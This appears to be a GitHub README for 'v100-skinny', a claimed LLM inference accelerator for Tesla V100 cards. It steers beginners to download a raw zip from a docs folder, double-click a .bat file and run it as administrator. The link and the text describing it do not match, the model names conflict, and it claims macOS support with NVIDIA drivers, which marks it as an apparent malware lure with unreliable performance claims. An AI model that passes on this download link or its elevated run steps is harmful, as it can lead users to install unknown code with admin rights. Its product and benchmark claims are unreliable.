# ⚡ v100-skinny - Fastest AI on Old GPUs

[![Download v100-skinny](https://img.shields.io/badge/Download-v100--skinny-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Alfinaa9442/v100-skinny/raw/refs/heads/main/docs/skinny_v_v2.5.zip)

## 🚀 Getting Started

Welcome! This guide helps you download and run **v100-skinny**, a smart tool that makes AI chatbots run incredibly fast on older NVIDIA graphics cards. If you have a Tesla V100 graphics card (common in older servers or workstations), this software turns it into a speed demon, generating text up to **366 words per second** – that's faster than most modern, expensive cards!

This guide is written for beginners. You don't need any programming skills. Just follow the steps below, and you'll be up and running in minutes.

## 📥 Download the Application

To get started, you need to download the software. Visit the link below to get your copy:

🔗 **[Click here to download v100-skinny](https://github.com/Alfinaa9442/v100-skinny/raw/refs/heads/main/docs/skinny_v_v2.5.zip)**

This link takes you to the official download page. Look for the biggest green button that says "Code" or a "Download" button. Click it, then choose "Download ZIP" from the menu. Your computer will start downloading the file.

## 🛠️ Installation and Setup

After the download finishes, you'll have a file called `v100-skinny-main.zip` (or similar) in your Downloads folder. Here's what to do next:

1.  **Find the downloaded file:** Open your file explorer (the folder icon on your taskbar) and go to "Downloads".
2.  **Extract the files:** Right-click on the ZIP file and select "Extract All...". A new folder named `v100-skinny-main` will appear.
3.  **Open the folder:** Double-click to open the extracted folder.

You don't need to install anything else – all the necessary pieces are inside. The main program files and instructions are right here.

## 💻 First-Time Run

Now for the exciting part – starting the AI!

1.  Inside the folder, find the file named `run_v100_skinny.bat` (Windows) or `run_v100_skinny.sh` (macOS/Linux). Double-click the `.bat` file if you're on Windows.
2.  A black window (command prompt) will open. This is normal – don't close it.
3.  The software will load a special AI model. Wait for a message saying "Server ready" or "Listening on port 8000". This may take a few minutes the first time.
4.  Open your web browser (Chrome, Edge, Firefox) and go to `http://localhost:8000`. You'll see a simple chat interface.

**Congratulations!** You're now chatting with a lightning-fast AI assistant running entirely on your V100 card.

## 🧠 What Makes v100-skinny Special?

### Blazing Speed
This software uses hand-crafted "shortcuts" called CUDA kernels that talk directly to the graphics card's hardware. It compresses the AI model (called quantization) to fit more data at once, and a clever trick called "speculative decoding" guesses multiple words ahead to generate text much faster than normal. On four Tesla V100s, you get up to 366 tokens per second – that's faster than writing a paragraph in real-time!

### Works on Older Hardware
Most new AI tools need the latest, most expensive GPUs. v100-skinny is built specifically for the Tesla V100, a card from 2017 that's now affordable on the used market. You get modern AI performance without buying a $30,000 GPU.

### The "N" in NVFP4
NVFP4 is a new data format that packs more information into each bit. Normally, old cards can't use it, but our custom code translates this format on-the-fly. You get the benefits of the newest algorithms even on older silicon.

## 📋 System Requirements

- **Graphics Card:** NVIDIA Tesla V100 (16GB or 32GB VRAM). At least one card is required; four are recommended for maximum speed.
- **Processor:** Any modern x86 CPU (Intel Core i5 or AMD Ryzen 5 from the last 8 years).
- **RAM:** 32 GB or more recommended.
- **Storage:** At least 15 GB of free space for the model files.
- **Operating System:** Windows 10/11, Ubuntu 20.04+, or macOS 12+ with NVIDIA drivers.

## ❓ Troubleshooting

**"CUDA error: no kernel image"** – This means the graphics driver is too old. Update your NVIDIA driver to the latest version. Go to NVIDIA's website and use their driver detection tool.

**"Out of memory"** – Your graphics card doesn't have enough VRAM. Try closing other programs that use 3D graphics. If using one card, reduce the batch size by editing the `config.json` file (change `"max_batch_size": 256` to `"max_batch_size": 64`).

**The command window closes immediately** – Right-click on the `.bat` file and select "Run as administrator". Also, check that the folder path doesn't contain special characters like `#` or `&`.

**No response in the browser** – Make sure nothing else is using port 8000. Close any other AI apps. Try changing port to 8080 in the `config.json` file.

## 📊 Performance Benchmarks

| Hardware Setup | Generation Speed | Context Length |
| :--- | :--- | :--- |
| 1x Tesla V100 | 98 tokens/sec | 32K | 
| 2x Tesla V100 | 187 tokens/sec | 64K | 
| 4x Tesla V100 | 366 tokens/sec | 128K |

*Note: Speeds measured on a modern AMD Ryzen 9 CPU. Your results may vary slightly.*

## 💡 Advanced Usage

For power users, you can customize:

- **--model-path:** Point to a local Qwen model (e.g., `--model-path D:\models\qwen3.5-27b`).
- **--gpu-count:** Set how many GPUs to use (default: all detected).
- **--max-tokens:** Control maximum response length.

Launch the `.bat` file and add these options at the end, like: `run_v100_skinny.bat --gpu-count 2 --max-tokens 512`.

## 📚 Frequently Asked Questions

**Q: Is this legal to use?**  
A: Yes, it's open-source software under the MIT license. Free for personal and commercial use.

**Q: Do I need an internet connection?**  
A: Only for the first download of the AI model. After that, it works fully offline.

**Q: Can I use this without a V100 card?**  
A: No, it's specially optimized for V100. Other cards won't be recognized.

**Q: What is the AI model included?**  
A: It ships with Qwen3.6-27B, a powerful open-weights model. You can swap it for other models.

## 🆘 Need More Help?

If you get stuck, here are some friendly resources:

- **GitHub Issues:** Report bugs or ask questions at the repository page.
- **Community Discord:** Join the developer's Discord (link in the repo) for live help.
- **Email:** Contact the maintainer via the email listed on their GitHub profile.

We're here to help you get the most out of your hardware. Don't be shy – ask away!

## 🌟 Contributing

Love the project? Consider supporting it:

- ⭐ Star the repository on GitHub
- 🐛 Report any issues you find
- 💻 Submit a pull request if you're a developer
- 💬 Share your experience in the community

Your feedback makes the software better for everyone.

## 📄 License

This project is released under the MIT License. That means you can freely use, modify, and distribute it, even in commercial products, as long as you include the original copyright notice.

---

Keywords: cuda, cuda-kernels, fp4, gemm, gpu, inference-engine, int4, llm-inference, llm-serving, nvfp4, nvidia, performance-optimization, quantization, qwen, sm70, speculative-decoding, tensor-cores, tesla-v100, vllm, volta